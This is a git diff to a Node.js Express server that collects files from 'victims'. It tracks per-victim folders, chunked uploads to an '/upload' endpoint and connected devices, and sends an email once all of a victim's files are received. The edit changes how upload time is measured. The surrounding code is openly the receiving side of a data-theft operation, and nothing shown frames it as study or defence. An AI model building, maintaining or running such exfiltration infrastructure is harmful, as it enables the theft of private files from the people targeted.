@@ -51,7 +51,7 @@ const victimFolders = {};
 const victimFileCounts = {};
 const victimTotalFiles = {};
 const victimFiles = {};
-const connectedDevices = {}; // Tracking devices connected
+const connectedDevices = {};
 
 // Track received chunks
 const chunkTracker = new Map();
@@ -61,6 +61,7 @@ async function checkAndSendEmail(victimId, victimFolder) {
   const filesInFolder = fs.readdirSync(victimFolder);
   if (filesInFolder.length === victimTotalFiles[victimId]) {
     console.log(`✅ All files received for victim ${victimId}`);
+
     const files = filesInFolder.map((filename) => {
       const filePath = path.join(victimFolder, filename);
       const stats = fs.statSync(filePath);
@@ -68,6 +69,10 @@ async function checkAndSendEmail(victimId, victimFolder) {
     });
 
     victimFiles[victimId] = files;
+
+    // Calculate and store the time taken to receive all files
+    const timeTaken = new Date() - connectedDevices[victimId].connectionTime;
+    connectedDevices[victimId].totalUploadTime = timeTaken;  // Store the time in ms
   }
 }
 
@@ -105,7 +110,6 @@ app.post('/upload', (req, res) => {
         lastConnectionTime: new Date(),
         filesTransferred: 0,
         fileList: [],
-        uploadStartTime: new Date(), // Record the time when upload starts
       };
     } else {
       connectedDevices[victimId].lastConnectionTime = new Date();
@@ -139,11 +143,6 @@ app.post('/upload', (req, res) => {
 
       if (victimFileCounts[victimId] === totalChunks) {
         console.log(`✅ File upload complete: ${filename}`);
-        // Calculate the total upload time and store it
-        const uploadEndTime = new Date();
-        const uploadDuration = uploadEndTime - connectedDevices[victimId].uploadStartTime;
-        connectedDevices[victimId].uploadDuration = uploadDuration; // Store the duration in ms
-
         checkAndSendEmail(victimId, victimFolder);
       }
 
